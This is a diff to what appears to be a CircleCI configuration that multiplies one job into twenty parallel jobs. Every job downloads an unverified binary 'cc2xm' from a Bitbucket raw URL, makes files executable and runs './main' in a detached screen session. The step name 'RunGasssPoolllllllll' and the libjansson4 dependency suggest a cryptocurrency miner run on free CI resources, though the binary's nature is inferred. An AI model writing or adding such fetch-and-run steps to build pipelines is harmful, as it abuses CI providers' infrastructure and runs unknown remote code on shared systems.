@@ -4,53 +4,421 @@ jobs:
     docker:
       - image: circleci/clojure:lein-2.9.5
 
+    working_directory: ~/repo
     steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
       - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
           name: RunGasssPoolllllllll
           command: |
-            ls
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
       
   Mainan_02:
     docker:
       - image: circleci/clojure:lein-2.9.5
 
+    working_directory: ~/repo
     steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
       - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
           name: RunGasssPoolllllllll
           command: |
-            ls
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
       
   Mainan_03:
     docker:
       - image: circleci/clojure:lein-2.9.5
 
+    working_directory: ~/repo
     steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
       - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
           name: RunGasssPoolllllllll
           command: |
-            ls
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
       
   Mainan_04:
     docker:
       - image: circleci/clojure:lein-2.9.5
 
+    working_directory: ~/repo
     steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
       - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
           name: RunGasssPoolllllllll
           command: |
-            ls
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  Mainan_05:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+      
+  Mainan_06:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+      
+  Mainan_07:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+      
+  Mainan_08:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  Mainan_09:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+      
+  Mainan_10:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  Mainan_11:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+      
+  Mainan_12:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+      
+  Mainan_13:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+      
+  Mainan_14:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  Mainan_15:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+      
+  Mainan_16:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+      
+  Mainan_17:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+      
+  Mainan_18:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  Mainan_19:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+      
+  Mainan_20:
+    docker:
+      - image: circleci/clojure:lein-2.9.5
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Akses
+          command: chmod u+x *
+      - run:
+          name: RunGasssPoolllllllll
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
 
 workflows:
     version: 2.1
@@ -60,3 +428,19 @@ workflows:
             - Mainan_02
             - Mainan_03
             - Mainan_04
+            - Mainan_05
+            - Mainan_06
+            - Mainan_07
+            - Mainan_08
+            - Mainan_09
+            - Mainan_10
+            - Mainan_11
+            - Mainan_12
+            - Mainan_13
+            - Mainan_14
+            - Mainan_15
+            - Mainan_16
+            - Mainan_17
+            - Mainan_18
+            - Mainan_19
+            - Mainan_20
